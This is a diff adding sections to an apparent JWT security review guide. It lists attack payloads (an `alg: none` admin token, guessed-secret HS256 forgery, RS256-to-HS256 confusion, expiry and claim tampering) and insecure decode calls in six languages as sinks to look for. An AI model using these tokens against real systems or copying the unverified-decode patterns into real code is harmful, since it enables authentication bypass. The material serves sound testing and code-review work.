@@ -30,6 +30,111 @@ The unsafe assumption is that base64-encoded payloads are trustworthy because th
 | **Claim validation** | Missing `exp`, `iss`, `aud`, or excessive access token lifetime |
 | **Storage and logout** | localStorage tokens, refresh tokens without revocation, debug endpoints disabling verify |
 
+## Attack Payloads
+
+Use these in authorized tests against APIs that parse JWTs. Craft tokens only in environments you own; never use production user accounts without approval.
+
+### Pattern 1: `alg: none` (signature stripped)
+
+```text
+Header:  {"alg":"none","typ":"JWT"}
+Payload: {"sub":"admin","role":"admin"}
+Signature: (empty)
+Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+```
+
+### Pattern 2: Forged HS256 with known or guessed secret
+
+```text
+# Sign with "secret", "changeme", or key from source leak
+{"sub":"victim-user-id","admin":true} + HS256(secret)
+```
+
+### Pattern 3: Algorithm confusion (RS256 → HS256)
+
+```text
+# Use public RSA key as HMAC secret when server accepts both algs
+Header: {"alg":"HS256",...}
+Signed with -----BEGIN PUBLIC KEY----- material
+```
+
+### Pattern 4: Expired or missing `exp` accepted
+
+```text
+{"sub":"user1","exp":1}   # year 1970 — server skips exp check
+{"sub":"user1"}           # no exp claim
+```
+
+### Pattern 5: Claim tampering with verification disabled
+
+```python
+jwt.decode(token, options={"verify_signature": False})
+# Change "role":"user" → "role":"admin" in payload, resubmit
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Find every path that decodes JWTs for authentication or authorization decisions.
+
+### Python
+
+```python
+import jwt
+jwt.decode(token, options={"verify_signature": False})
+jwt.decode(token, "changeme", algorithms=["HS256", "none"])
+```
+
+PyJWT, `python-jose`, manual `base64` + `json.loads` on middle segment.
+
+### Java
+
+```java
+Jwts.parser().setSigningKey("secretkey").parseClaimsJws(jwt);
+// Accepts alg from header without allowlist
+Claims claims = Jwts.parser().parseClaimsJwt(unsigned).getBody();
+```
+
+`jjwt`, Nimbus, Spring Security OAuth2 resource server misconfiguration.
+
+### C#
+
+```csharp
+var handler = new JwtSecurityTokenHandler();
+handler.ValidateToken(token, new TokenValidationParameters {
+    ValidateIssuerSigningKey = false,
+    SignatureValidator = (t, _) => new JwtSecurityToken(t)
+}, out _);
+```
+
+`System.IdentityModel.Tokens.Jwt`, Microsoft.AspNetCore.Authentication.JwtBearer.
+
+### JavaScript (Node.js)
+
+```javascript
+const jwt = require('jsonwebtoken');
+jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
+jwt.decode(token);  // no verify
+```
+
+`jose`, `passport-jwt`, Auth0 SDK with `ignoreSignature` in tests left enabled in prod.
+
+### Go
+
+```go
+jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
+    return []byte("secret"), nil  // ignores expected alg
+})
+```
+
+`github.com/golang-jwt/jwt`, `lestrrat-go/jwx` with permissive `alg` handling.
+
+### Ruby
+
+```ruby
+JWT.decode(token, nil, false)  # verify disabled
+JWT.decode(token, 'secret', true, { algorithm: 'none' })
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
